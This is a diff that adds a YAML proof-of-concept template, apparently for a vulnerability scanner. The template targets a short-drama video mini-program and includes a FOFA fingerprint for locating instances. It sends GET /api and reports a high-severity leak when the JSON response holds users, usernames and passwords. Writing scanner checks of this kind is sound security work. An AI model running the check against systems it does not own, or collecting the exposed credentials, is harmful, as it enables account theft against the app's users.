@@ -1,0 +1,16 @@
+id: poc-yaml-movie-app-api-info-leak
+info:
+  name: 短剧影视小程序api敏感信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 小剧场短剧影视小程序
+  fofa: /VwmRIfEYDH.php
+requests:
+- method: GET
+  path: /api
+  expression: "status_code == 200 && \ncontains(body,\"\\\"users\\\"\") &&\ncontains(body,\"\
+    \\\"username\\\"\") &&\ncontains(body,\"\\\"password\\\"\") &&\ncontains(headers,\"\
+    application/json\")\n"
+variables: {}
+transport: http
